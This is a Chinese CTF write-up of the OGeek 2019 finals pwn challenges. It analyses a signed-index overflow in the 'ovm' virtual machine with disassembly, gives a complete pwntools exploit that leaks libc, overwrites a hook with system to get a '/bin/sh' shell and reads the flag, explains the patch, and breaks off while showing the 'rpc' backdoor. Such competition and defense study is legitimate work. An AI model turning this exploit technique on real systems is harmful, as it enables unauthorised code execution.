# OGeek CTF 2019 线下决赛 pwn 题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
第一次参加线下赛，感觉还是很不错的，就是自己太菜了。从比赛中也发现了自己的一些缺点，比如做题的速度太慢了（菜鸟的特性），还好这次比赛防御方也能拿到很高的分，这才没有拖队友后腿。
OGeek CTF 2019 线下决赛 pwn 题解
源程序下载，修复后的程序也在链接中：。
## ovm
一个模拟的虚拟机，难度比`byte ctf 2019 的
ezarch`要小，溢出点主要是对于`reg`、`memory`和`stack`的偏移没有限制，使得其可以向上，或者向下溢出。
虽然可以溢出，但是由于偏移的变量是`int`型，所以下溢是基本没有什么用的，因为`libc`和程序基地址的差比这个大多了，所以只能采取向上溢出的策略，读取got表地址，然后利用虚拟程序的特性进行加减偏移，从而劫持`comment`变量，使其指向hook，在最后的`sendcomment`中会直接触发hook。
这里我刚开始的犯了一个错误，我是直接用`IDA`反汇编进行查看的，看到的`index`是`_DWORD`类型的，所以我就下意识的以为`index`是属于`unsigned
int`型变量，所以以为是不可能发生上溢的情况的，直到我直接看汇编代码才发现，`index`是有符号位扩展指令的（`movsxd`)，所以`index`的类型应该是`int`型。这里我的失误是太依赖于工具了。如果直接看汇编代码就能一眼看出其类型。
下面我总结了程序中的上溢读和上溢写。
下面是上溢读代码：
    ;// reg[three_byte] = memory[reg[one_byte]];
    loc_EEE:
    movzx   ecx, [rbp+three_byte]
    movzx   edx, [rbp+one_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     edx, [rax+rdx*4]
    lea     rax, memory
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, reg
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
第二处：
    ;// reg[three_byte] = stack[--reg[13]];     // stack
    loc_F95:
    movzx   ecx, [rbp+three_byte]
    lea     rax, reg
    mov     eax, [rax+34h]
    lea     edx, [rax-1]
    lea     rax, reg
    mov     [rax+34h], edx
    lea     rax, reg
    mov     edx, [rax+34h]
    lea     rax, stack
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, reg
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
上面的代码可以先通过下溢修改`reg[13]`的值，然后在进行符号位扩展。这样也能像`memory`一样实现上溢。
下面是上溢写的代码：
    ;// memory[reg[one_byte]] = reg[three_byte];
    loc_F24:
    movzx   edx, [rbp+one_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     ecx, [rax+rdx*4]
    movzx   edx, [rbp+three_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, memory
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
第二处：
这里的利用方式和第二种上溢读的原理一样。
    ;// v1 = reg[13];
    ;// reg[13] = v1 + 1;
    ;// stack[v1] = reg[three_byte];
    loc_F5A:
    lea     rax, reg
    mov     eax, [rax+34h]
    lea     ecx, [rax+1]
    lea     rdx, reg
    mov     [rdx+34h], ecx
    movzx   ecx, [rbp+three_byte]
    lea     rdx, reg
    movsxd  rcx, ecx
    mov    edx , [rdx+rcx*4]
    mov     ecx, edx
    lea     rdx, stack
    cdqe
    mov     [rdx+rax*4], ecx
    jmp     loc_1205
上面这段汇编中，因为对`index`进行了`cdqe`符号位扩展，所以可以向上溢出。
综上所述，只要任意一个上溢读和上溢写结合，就能使得漏洞被利用。
**利用脚本：**
这里我只写了最为简单的一种利用方式。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'error'
    execve_file = './ovm'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    # host = '10.0.%s.2' % sys.argv[1]
    # sh = remote(host, 10990)
    # elf = ELF(execve_file)
    # # libc = ELF('./libc-2.27.so')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        # b execute
        # b fetch
        b sendcomment
        b *$rebase(0xF24)
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def main(id):
        host = '10.0.%s.2' % id
        sh = remote(host, 10990)
        sh.sendlineafter('PC: ', '2')
        sh.sendlineafter('SP: ', '0')
        layout = [ # 1098
            u32((p8(0x10)+p8(0)+p8(0)+p8(8))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(1)+p8(0xff))[::-1]) ,
            u32((p8(0xc0)+p8(2)+p8(1)+p8(0))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(2)+p8(0xc6))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x30)+p8(9)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x30)+p8(10)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(5)+p8(0x10))[::-1]) ,
            u32((p8(0xc0)+p8(5)+p8(1)+p8(0))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(5)+p8(0x98))[::-1]) ,
            u32((p8(0x70)+p8(5)+p8(1)+p8(5))[::-1]) ,
            u32((p8(0x70)+p8(9)+p8(9)+p8(5))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(5)+p8(49))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(2)+p8(1))[::-1]) ,
            u32((p8(0x40)+p8(9)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0x40)+p8(10)+p8(1)+p8(2))[::-1]) ,
            u32((p8(0xff)+p8(0)+p8(0)+p8(0xff))[::-1]),
        ]
        sh.sendlineafter('CODE SIZE: ', str(len(layout)))
        sh.recvuntil('CODE: ')
        # pause()
        for v in layout:
            sh.sendline(str(v))
        sh.recvuntil('R9: ')
        low_byte = int(sh.recvuntil('n'), 16)
        sh.recvuntil('R10: ')
        high_byte = int(sh.recvuntil('n'), 16)
        system_addr = high_byte * 0x100000000 + low_byte - 0x39e4a0
        log.success('system_addr: ' + hex(system_addr))
        sh.send('/bin/sh' + p64(system_addr))
        sh.sendline('cat flag')
        sh.recvuntil('x00By')
        return sh.recvuntil('n')
    if __name__ == "__main__":
        host = '10.0.%s.2' % sys.argv[1]
        print(main(sys.argv[1]))
###  修复
要修复也比较简单，只要去掉程序的符号位扩展指令就行了，这样程序就无论如何都无法上溢了，但是有一点要特别注意，一定要修复完全，不然就可能被利用其它的漏洞组合打通，修改下溢漏洞是很困难的，而且根本没有必要，所以可以直接不管。
## rpc
这题在比赛时，我并没有写出来，但是这题应该只有两个后门漏洞，而且挺明显的，通过查找危险函数就能发现其不对劲，由于并不存在较深的逻辑漏洞，所以这题也守住了。
**预置后门：**
    void __fastcall back_door(int a1)
    {
        ...
        read(a1, v4, 0x24uLL);